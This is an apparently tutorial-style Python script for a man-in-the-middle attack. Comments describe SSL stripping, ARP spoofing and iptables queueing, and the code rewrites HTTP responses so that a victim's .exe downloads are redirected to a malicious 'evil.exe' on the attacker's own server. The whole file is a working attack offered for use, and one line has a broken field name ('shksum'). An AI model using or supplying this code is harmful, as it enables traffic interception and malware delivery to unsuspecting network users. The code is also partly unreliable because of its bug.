# The basic way is to communicate with the site using the http
# There is a script which can convert the https web pages to the http
# NOTE: This is {sslstrip: byMoxie Marlinespike} install it and run
# Need to flush the iptables: $iptables --flush
# $ python arp_spoofer.py
# Redirect the trafic to running port of sslstrip {10000 by default}
# $ iptables -I OUTPUT -j NFQUEUE --queue-num 0
# $ iptables -I INPUT -j NFQUEUE --queue-num 0
# $ iptables -t nat - A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000
# $ python packet_sniffer.py

#You have to pass all the packet through the queue from your pc:
#>> $ iptables --flush
#>> $ iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load =load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].shksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.16" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # We upload our evil.exe file on the apache server running on our linux locally that would replace the exe file.
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.16/evil-files/evil.exe")
                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
